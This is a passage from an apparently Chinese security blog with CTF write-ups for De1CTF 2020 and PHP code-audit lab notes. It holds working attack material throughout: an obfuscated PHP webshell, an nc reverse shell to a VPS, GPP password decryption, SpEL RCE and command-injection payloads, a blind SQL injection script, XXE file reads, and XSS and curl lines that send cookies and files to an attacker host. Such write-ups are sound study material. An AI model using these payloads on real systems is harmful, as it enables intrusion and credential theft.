$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____='_'?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_])?&gt; 当时还顺手nmap扫了下 12345678910111213141516Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 13:27 CSTNmap scan report for 47.113.219.76Host is up (0.016s latency).Not shown: 997 filtered portsPORT STATE SERVICE VERSION22/tcp closed ssh80/tcp open http Microsoft IIS httpd 8.5 (PHP 7.2.29)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Unknown|_http-title: upload3389/tcp closed ms-wbt-serverService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 118.83 seconds 然后想抱郁师傅大腿失败了…只能靠自己了。因为题目同一个ip被出成两个题，基本很容易能看出来要么是单纯提权,要么是windows域渗透。 这里windows靶机八成就是为了域渗透准备的。 硬着头皮不管3721先弹个shell当时根目录有别的师傅传的NC,那就不用我自己传了。 1.\\nc.exe vpsip port -e powershell 这样不至于在uploads目录被删时丢掉所有shell.然后传个winPEAS.exe 进行信息收集。这个也是做htb时学到的脚本，一般是为了提权扫描下。基本上能满足需求。信息里有一处比较明显 脚本列出的信息中有一个域用户名字很敏感。HintZip_Pass下面开始手动信息收集 参考这篇文章域渗透总结 域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机 所以域渗透的核心是通过可控的域用户，收集其中的可用信息，进一步利用其他漏洞发展更多域用户。最后能拿到管理员的哈希，基本就算渗透完整了。 ipconfig /all可以确认处于域管理模式中 123456789101112PS C:\\Users\\Public&gt; net user &#x2F;domainnet user &#x2F;domainThe request will be processed at a domain controller for domain De1CTF2020.lab.User accounts for \\\\dc.De1CTF2020.lab-------------------------------------------------------------------------------Administrator De1CTF1 de1ta Guest HintZip_Pass krbtgt web The command completed successfully. 查询域用户时也能得到跟winPEAS一样的关于域用户的信息。尝试net use 12345678910PS C:\\&gt; net usenet useNew connections will be remembered.Status Local Remote Network-------------------------------------------------------------------------------OK \\\\192.168.0.12\\Hint Microsoft Windows NetworkThe command completed successfully. 发现\\\\192.168.0.12\\Hint。且由于我们刚刚是建立的IPC空链接。因此可以无需用户名密码访问它。(不过我后来再看时发现这个地址没了)net view\\\\192.168.0.12\\也能发现有Hint,SYSVOL,NETLOGIN几个目录 直接pushd\\\\192.168.0.12\\Hint进入filesystem.发现了一个flag1_and_flag2hint.zip 基于我们玩的是多人渗透。所以最好把它copy到自己私密的位置。或者把它以其他文件格式保存下来。(因为我在思考如何把它拿下来时刚好在蚁剑的shell里发现别人的zip文件2333)直接下好别人的zip后,现在要一个密码 这里就体现出信息收集的重要性了。因为我们之前发现可以用的文件夹除了Hint还有SYSVOL.所以我选择百度域渗透 SYSVOL得到这篇文章域渗透——利用SYSVOL还原组策略中保存的密码在域中，存在一个默认的共享路径\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\ 域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\\SYSVOL下，默认所有域内用户可访问，虽然密码通过AES 256进行加密，密钥是公开在微软官网的。 参考这篇文章域渗透：GPP(Group Policy Preferences)漏洞可以使用dir /s /a \\\\域控IP\\SYSVOL\\*.xml来尝试列出存在的xmldir /s /a \\\\192.168.0.12\\SYSVOL\\*.xml得到完整路径后读取。这里试了下type不行，gc不行。用more成了more \\\\192.168.0.12\\SYSVOL\\De1CTF2020.lab\\Policies\\{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}\\Machine\\Preferences\\Groups\\Groups.xml 123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;\"&gt;&lt;User clsid=\"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;\" name=\"HintZip_Pass\" image=\"2\" changed=\"2020-04-15 14:43:23\" uid=\"&#123;D33537C1-0BDB-44B7-8628-A6030A298430&#125;\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08\" changeLogon=\"1\" noChange=\"0\" neverExpires=\"0\" acctDisabled=\"0\" userName=\"HintZip_Pass\"/&gt;&lt;/User&gt;&lt;/Groups&gt; 这个cpassword恰好是属于HintZip_Pass的。那么根据上文，由于私钥暴露。只要知道公钥cpassword即可破解。 kali有现成的gpp-decrypt 直接用gpp-decrypt uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08就成。得到密码后解出zip文件 这题做完后后续提示看都不想看了.真的是难.不过收获特挺多的。(以后我一定好好学渗透.jpg) calc昨天比赛时没做出来…第二天zjy师傅构造出了payload。才感慨自己还是太菜了。 抓包就能得到spel/calc?calc=的路由提示的这么明显，只能是spEL的表达式注入了。不过简单FUZZ一下，发现果不其然有waf。大概有这些关键字吧，#,getClass, T( ,java.lang, new ,String,想要直接RCE当然不行。所以得构造 第一想法是查资料，找到不少师傅做code-breaking时用反射进行spEL-RCE的payload原本是 1Runtime.getRuntime().exec() 通过反射，我们就能巧妙利用反射构造出类与方法。使用字符串拼接绕过。 1String.class.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"exec\",String.class).invoke(String.class.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(String.class.getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),\"curl xxxx\"); 但是这里String,getClass没了。不过也有方法绕过使用&#39;&#39;[&#39;class&#39;]数组直接绕这是参考SEAM2.3.1的一个反序化payload的改法 1''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'curl 172.17.0.1:9898') 然而payload打了一发发现报错。然后就无语了。这时想起来,抓包时发现header里有openrasp,估计是直接从底层把runtime之类的给hook掉了。 然后郁师傅说不用执行命令也能读。仔细想挺有道理的,不然没必要直接告诉我们flag在根目录但是确实java太菜了…下面是队友教我的方法。 1New java.io.BufferedReader(New java.io.FileReader(\"/flag\")).readLine() 原来在spEL里是不区分关键字大小写的…那直接用java能读文件的类来就行了…Java 读文件的5种方式同理也可 1New java.util.Scanner(New java.io.File(\"/flag\")).nextLine() java是真的要好好研究下了 ps:在推送里看到一篇文章恰好提到了De1这题。才发现dalao直接bypass openrasp进行RCE了…参考:bypass openrasp SpEL RCE 的过程及思考原来深挖spEL的底层解析源码，可发现空字符能直接bypass.所以，又可以产生完全不依赖new的实例化方法.直接空字符插进被过滤的T(中即可 甚至进一步，还能通过反序列化的思想,不显示的加载恶意类,达成RCE。orz原来java的姿势这么多的么… mixture可以任意登录member.php注释中有 orderby测了下发现应该是order by 后的语句开始以为只能接limit那有且仅有procedure analyse一种方法但报错函数都没了。延时延不了。版本问题只能用5.6以下的函数。真心没手段了我有罪，这种难度的sql被卡住。该打。 直接and 分流我居然会忘了。 1234567891011121314151617181920import requestsimport urllib.parseurl='http://134.175.185.244/member.php?orderby='flag=\"\"for i in range(1,30): print(i) a=0 for str1 in \"qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890,\": payload = \"and case when (substr((select password from member),\"+str(i)+\",1)='\"+str1+\"') then (benchmark(500000,sha(1))) else 1 end\" payload = urllib.parse.quote(payload) try: r = requests.get(url + payload, timeout=2.5) except requests.exceptions.ReadTimeout: flag+=str1 print(flag) a=1 break if a==0: break 求得密码解出来得到goodlucktoyou 进去后一开始发现有一个select.php任意读文件的功能与admin.php给出的phpinfo,但是读完源码后发现居然使用了Minclude这个函数来包含。phpinfo里也能看到这个函数的so文件….所以这题真面目是WEB-PWN,应该是通过调这个so来溢出执行根目录的readflag… 然而比赛已经快结束了，等于白给。 AnimalCrossing这题等wp吧…老实说不想复现了。因为题目得到flag除了要弹admin的cookie,还要从admin界面的图片获取信息…没见过这么磨人的xss. 5.18复现: 今天整理仓库时偶然发现De1CTF这个题是有docker环境的。于是就起了个环境尝试复现下。发现学到了不少姿势。 首先第一步自然是利用那个可能达成xss的点了。本题是在这个url中的data位置 但是此处self-xss的达成都十分困难。因为一方面存在waf过滤掉字符(这里如果parse失败回显也是按遇到waf判断的,所以要注意语法的规范)。同时还有个CSP.default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;当然这个CSP很好绕。使用location这一类型的跳转就可以了。难点在于绕waf达成后面的js代码执行。 看到sky师傅的wp后才恍然大悟。(膜一叶飘零师傅,自己很多知识都是从他的文章那学来的).原来是可以利用js的一个trick,而且自己曾经大概接触过。 先解释下这里的xss执行我们的数据可以直接通过url中data参数拼接进这里的js代码。首先自然使用1&#39;//保证代码语法的合法性。之后考虑的就是,怎么样在单引号跟注释符中间这部分使用js代码绕过waf进行xss。于是这里就要提到js的一个trick了。先解释下sky师傅的payload。对于js中一个对象而言,其valueOf()方法会返回对象本身。而当我们将对象与二元运算符进行操作时,将会调用valueof方法。那么这样就简单了,只要能控制valueOf()方法返回值,就能执行任意js代码。那么此处payload就可以构造成 1'+&#123;\"valueOf\":new \"\".construcor.constructor(atob('base64xsspayload'))&#125;+1// 使用constructor获取到匿名函数这个在nodejs里已经非常熟悉了。同时这里+1就可以直接触发valueOf.最后我们为了绕过waf使用吧base64绕过。 当然使用其他方法都可以。我看见榜一的mslcpayload大概也是用二元运算符加上base64paylaod达成的。只不过用的是js伪协议。形式上简单了许多 123payload&#x3D;javascript:&#123;window.location.href&#x3D;&quot;vpsip&#x2F;?&quot;+document.cookie&#125;data&#x3D;1&#39;%2bopen(atob(&#39;base64encodepaylaod&#39;))&#x2F;&#x2F; 后面打给admin收flag因为docker环境不知道为什么内网服务没起来,所以没法继续复现了。后面大致的内容就是发现admin的页面有照片,所以可以一个个下下来拼图即可。(用到了之前的pngbypassCSP的内容) 小结这次比赛还是几乎全程自闭。虽然大家应该都差不多吧。而且没想到的是自己居然是WEB主C,估计以后也会这样承担起比以往更大的责任了.学长们没打，就只能靠自己。可能一直以来心里觉得有郁离歌在,这些题目都不是事的.然而这次De1直接泼了一头冷水，提醒我最后还是得靠自己。硬实力才是王道。 马上网鼎也来了，这段时间争取把java安全能入个门，php代审过完吧。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"PHP-Audit-Labs审计学习","slug":"PHP-Audit-Labs审计学习","date":"2020-04-27T14:53:31.000Z","updated":"2021-02-18T05:09:43.279Z","comments":true,"path":"2020/04/27/PHP-Audit-Labs审计学习/","link":"","permalink":"https://www.bycsec.top/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/","excerpt":"打算在代码审计上入下坑。本来找了个不知名cms想审计一下的。偶然间看到了星盟王叹之师傅在用php-audit-labs练审计,所以自己也打算练一下审计的技术,毕竟自己审计功力太差了…p牛也曾经说过,练习审计到能看懂一个完整的CMS就算有一定功底了。所以就把php-audit-labs的全部都过一遍吧。 (最近也总算熟练了一下node跟python相关的开发入门。等之后找时间把java入门知识过一遍,再把ECMAscript6的基础过一遍就差不多了）","text":"打算在代码审计上入下坑。本来找了个不知名cms想审计一下的。偶然间看到了星盟王叹之师傅在用php-audit-labs练审计,所以自己也打算练一下审计的技术,毕竟自己审计功力太差了…p牛也曾经说过,练习审计到能看懂一个完整的CMS就算有一定功底了。所以就把php-audit-labs的全部都过一遍吧。 (最近也总算熟练了一下node跟python相关的开发入门。等之后找时间把java入门知识过一遍,再把ECMAscript6的基础过一遍就差不多了） Day1in_array()任意文件上传漏洞。主要问题在于in_array()函数的使用不当。如果未设置in_array()第三个参数为true则我们可以通过上传7shell.php绕过检查。因为7shell.php被转换为7.同样出现在某cms中利用这点可以绕过进行insert_into注入当in_array()绕过后轻松达成注入。1,1 and if(ascii(substr((select database()),1,1))=112,1,sleep(3)));# 练习config.php 12345678910111213141516&lt;?php $servername = \"localhost\";$username = \"root\";$password = \"root\";$dbname = \"day1\";function stop_hack($value)&#123; $pattern = \"insert|delete|or|concat|concat_ws|group_concat|join|floor|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval\"; $back_list = explode(\"|\",$pattern); foreach($back_list as $hack)&#123; if(preg_match(\"/$hack/i\", $value)) die(\"$hack detected!\"); &#125; return $value;&#125;?&gt; index.php 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpinclude 'config.php';$conn = new mysqli($servername, $username, $password, $dbname);if ($conn-&gt;connect_error) &#123; die(\"连接失败: \");&#125;$sql = \"SELECT COUNT(*) FROM users\";$whitelist = array();$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); $whitelist = range(1, $row['COUNT(*)']);&#125;$id = stop_hack($_GET['id']);$sql = \"SELECT * FROM users WHERE id=$id\";if (!in_array($id, $whitelist)) &#123; die(\"id $id is not in whitelist.\");&#125;$result = $conn-&gt;query($sql);if($result-&gt;num_rows &gt; 0)&#123; $row = $result-&gt;fetch_assoc(); echo \"&lt;center&gt;&lt;table border='1'&gt;\"; foreach ($row as $key =&gt; $value) &#123; echo \"&lt;tr&gt;&lt;td&gt;&lt;center&gt;$key&lt;/center&gt;&lt;/td&gt;&lt;br&gt;\"; echo \"&lt;td&gt;&lt;center&gt;$value&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;\"; &#125; echo \"&lt;/table&gt;&lt;/center&gt;\";&#125;else&#123; die($conn-&gt;error);&#125;?&gt; 这题的in_array()并不是难点。因为只要id开头为数字就能绕过了主要问题在于后面注入上。所幸语句中会爆出sqlerror.在过滤了这些关键字的情况下仍可以使用报错函数,select,from等基本就足够得到flag了。不过这里存在一个细节,就是updatexml这样的报错函数如果语句中不包含特殊字符也就是我们原来经常使用的0x7e之类的字符，爆出的结果将会出现字符丢失的现象。 所以找替代的字符串连接函数即可.make_set() 1?id&#x3D;4 and (select updatexml(1,make_set(3,&#39;~&#39;,(select flag from flag)),1)) 其实自己原来做sql注入的题目也曾搜索过相关的内容。比如在concat被过滤的情况下不使用group_concat将所有查询结果都列出来。当时发现make_set()是能起到concat一样的效果的。但是注意的是,make_set至少接收两个参数,因此必须使用逗号。concat类则不然。 Day2filter_var() 题目主要是在两处存在过滤。首先是twig模板里出现的link被escape了 然后是一个filter_var()函数这里escape过滤器调用的实际上是htmlspecialchars()函数。作用自然是将常见的特殊字符转为实体字符。而filter_var()在curl的ssrf中就曾见过。主要检查一个url是否合法。因此代码逻辑主要是经过过滤后生成一个a标签。那么可能存在self-xss 官方的payload?nextSlide=javascript://comment％250aalert(1)达到弹窗的self-xss. 使用javascript伪协议绕过巧妙的就是利用filtervar的缺陷轻松使用xxx://的形式绕过检查。然后也可以进行js语句的执行。重要的一点就是//在js中是注释符。因此使用%250a(double urlencode %0a 以绕过浏览器自动的解码)将后面的内容换行到下一行。成功执行alert. 某cms中的利用是,在访问404页面存在这样的代码 1&lt;code&gt;&lt;?php echo current_url(); ?&gt;&lt;/code&gt; current_url()方法接受完整的404url参数。返回最后一个/后的内容拼接进code代码块。即可以插入xss代码&lt;script&gt;alert(1)&lt;/script&gt;导致了xsspayloadhttp://localhost/anchor/index.php/&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt; 练习12345678910111213141516171819202122// index.php&lt;?php $url = $_GET['url'];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123; $site_info = parse_url($url); if(preg_match('/sec-redclub.com$/',$site_info['host']))&#123; exec('curl \"'.$site_info['host'].'\"', $result); echo \"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;\"; echo implode(' ', $result); &#125; else&#123; die(\"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;\"); &#125;&#125;else&#123; echo \"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;\";&#125;?&gt; 1234// f1agi3hEre.php&lt;?php $flag = \"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;\"?&gt; 一个明显的curl。而且还是经典的可绕过的filter_var()+parse_url()+exec()执行curl的配置。那现在关键是利用这个来进行文件读取。比如把之前的可绕过filter_var()+parse_url()的payload拿出来 12demo:&#x2F;&#x2F;evil.com:80;sec-redclub.com:80&#x2F;demo:&#x2F;&#x2F;evil.com:80,sec-redclub.com:80&#x2F; 这里想要执行命令读取文件。那么恰好可以用到linux中使用分号进行命令分割的作用。demo://%22;ls;%23;sec-redclub.com:80/然后为了读文件使用&lt;代替空格demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/ 单纯针对filter_var的话把七月火师傅的payload放出来 12345678http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.comhttp:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.comPS:最后一个payload的#符号，请换成对应的url编码 %23 Day3class_exists()&amp;&amp;内部类xxe 上面的代码有一个比较过时的路径穿越的文件包含的洞。即调用class_exists()函数时会自动加载__autoload()。达成文件包含。如果是ph5-5.3则可以构造路径穿越。还有一个洞比较有意思。实例化类的类名和传入类的参数均可控。此时即使没有恶意类我们也能用SimpleXMLElement构造xxe攻击。这点我在buu上做SUCTF 2018 Homework这题时也用到了它达成xxe并进一步使用xxe打ssrf 某cms的利用是一个可控变量带来的反序列化XXE.具体利用不谈。简单说下gadget最后的利用。类中实现了一个反射类实例化。而类名可控。之后连反射类的参数也是可控的。导致我们可以任意实例化SimpleXMLElement并构造xxepayload进行攻击。根据实际情况构造payload{&quot;Shopware\\\\Bundle\\\\SearchBundle\\\\Sorting\\\\PriceSorting&quot;:{&quot;direction&quot;:&quot;asc&quot;}}这里几个参数尤其是2那个印象很深刻,同时也很必要。SUCTF那题就是如此{&quot;SimpleXMLElement&quot;:{&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0}} 练习12345678910111213141516171819202122// index.php&lt;?phpclass NotFound&#123; function __construct() &#123; die('404'); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.'=&gt;'.$value.'&lt;br&gt;';&#125; 1234// f1agi3hEre.php&lt;?php$flag = \"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;\";?&gt; 利用经过上面的铺垫就很简单了。直接用可控的参数进行xxe即可。但是需要注意的是,xxe需要进行php文件流来进行内容读取。因为&lt; &gt; &amp; &#39; &quot;等字符会使xml解析出错。不过用base64读文件这种解决办法想必早就是轻车熟路了吧。?name=SimpleXMLElement&amp;param=&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2 假如题目不知道flag的名字还可以用另外的类进行文件名的读取。?name=GlobIterator&amp;param=./*.php&amp;param2=0作用与glob差不多。 Day4str_pos()错误使用 php许多函数因为弱类型或黑魔法诞生了各种各样的漏洞。str_pos()也是如此。上面的代码看似严格限制了内容不能含有&lt;与&gt;。然而str_pos返回的值可以是0.即匹配的字符串首个字符就是&lt;，&gt;。既然如此，！strpos()返回的就是真值。成功绕过。payload:&lt;&quot;&gt;&lt;injected-tag%20property=&quot;&amp;pass=&lt;injected-tag&gt;同样类似的漏洞也常见于preg_match()这样的函数。因为它可能会因为传入数组或者正则回溯导致返回false值。如果开发者所写的判断只是!preg_match()就很容易绕过了。 某CMS中的问题也是弱类型的锅。使用若类型相等判断时，假如数据库中存储的值是空字符串。那么当null与””进行弱类型相等时将返回true. 1234null=='' //true\"0.0\"==\"0\" //true\"0.\"==\"0\" //true\"0e\"==\"0\" //true 练习这是攻防世界上做过的原题。应该是lottery这个把。用到的是json的弱类型。json弱类型判相等时，只要传入true与非零数字。结果都将返回true json弱类型比较出名的一个比较就是数字与字符串之间的转换 1230&#x3D;&#x3D;&quot;0a....sds&quot;12&#x3D;&#x3D;&quot;12fw...sd&quot;789&#x3D;&#x3D;&quot;789asabxz&quot; 字符串会被直接截取前面的纯数字部分进行判断 Day5escapeshellcmd()+escapeshellarg() 主体上就是一个过滤了后的mail函数执行。mail函数的参数是这样的 1234567bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]]) 由于默认调用的是linux的sendmail函数，所以可以在message中写入恶意代码。接着由additional_parameters 指定额外参数，从而写入在指定目录写入文件。 但是，php的mail函数也在底层默认执行了一层escapeshellcmd()函数，那么显然转义了我们的恶意代码。不过，本题代码还有一处经典的escapeshellarg()。如果escapeshellarg()+escapeshellcmd()搭配使用，将出现特殊字符逃逸的问题。buu上也有一个类似的题目.这里则借用项目里的例子简单介绍下 12345127.0.0.1' -v -d a=1#escapeshellarg'127.0.0.1'\\'' -v -d a=1'#escapeshellcmd'127.0.0.1'\\\\'' -v -d a=1\\' 此时最后一步可以看出，\\\\将被解释为\\不再起到转义的作用，而是作为换行符。因此payload变为先是127.0.0.1，再-v -d-d对应的数据为a=1&#39;. 比如CVE-2016-10033 跟CVE-2016-10045的两个payload 123a( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.coma&#39;( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com 前者没有escapeshellcmd直接打。后者escapeshellcmd后又加了一层escapeshellarg导致字符逃逸。 练习12345678910111213141516171819202122232425262728293031323334353637383940//index.php&lt;?phphighlight_file('index.php');function waf($a)&#123; foreach($a as $key =&gt; $value)&#123; if(preg_match('/flag/i',$key))&#123; exit('are you a hacker'); &#125; &#125;&#125;foreach(array('_POST', '_GET', '_COOKIE') as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125;if($_POST) &#123; waf($_POST);&#125;if($_GET) &#123; waf($_GET); &#125;if($_COOKIE) &#123; waf($_COOKIE);&#125;if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET['flag']))&#123; if($_GET['flag'] === $_GET['hongri'])&#123; exit('error'); &#125; if(md5($_GET['flag'] ) == md5($_GET['hongri']))&#123; $url = $_GET['url']; $urlInfo = parse_url($url); if(!(\"http\" === strtolower($urlInfo[\"scheme\"]) || \"https\"===strtolower($urlInfo[\"scheme\"])))&#123; die( \"scheme error!\"); &#125; $url = escapeshellarg($url); $url = escapeshellcmd($url); system(\"curl \".$url); &#125;&#125;?&gt; 1234// flag.php&lt;?php$flag = \"HRCTF&#123;Are_y0u_maz1ng&#125;\";?&gt; 很明显的变量覆盖，之后要绕过waf。再接下来就是escapeshellsmd/arg的搭配进行命令执行了。首先要解决的是，我们必须绕过preg_match的限制才能传入flag变量。因此要利用好它写好的这个功能。 首先这里利用了可变变量的特性。假设我们提交 12?flag&#x3D;test post:_GET[flag]&#x3D;test 当开始遍历 $_POST 超全局数组的时候， $__k 代表 _GET[flag] ，所以 $$__k就是 $_GET[flag] ，即 test 值，此时 $$__k == $__v 成立，变量 $_GET[flag] 就被 unset 了 而接下来下面又有一个变量覆盖if($_POST) extract($_POST, EXTR_SKIP);所以直接得到$_GET[flag]=test绕过第一层 第二层只需利用0e的MD5弱类型比较最后是curl的命令执行http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vps:9999似乎当curl版本变高后，将不再能执行。curl &#39;127.0.0.1&#39;\\&#39;&#39; Day6正则不当导致路径穿越 任意文件删除漏洞。主要是preg_replace()函数的使用不当。忽略了../../这种路径。可以使用路径穿越进行任意文件删除 练习12345678910111213141516171819202122232425262728293031// index.php&lt;?phpinclude 'flag.php';if (\"POST\" == $_SERVER['REQUEST_METHOD'])&#123; $password = $_POST['password']; if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) &#123; echo 'Wrong Format'; exit; &#125; while (TRUE) &#123; $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); foreach ($ps as $pt) &#123; if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1; &#125; if ($c &lt; 3) break; if (\"42\" == $password) echo $flag; else echo 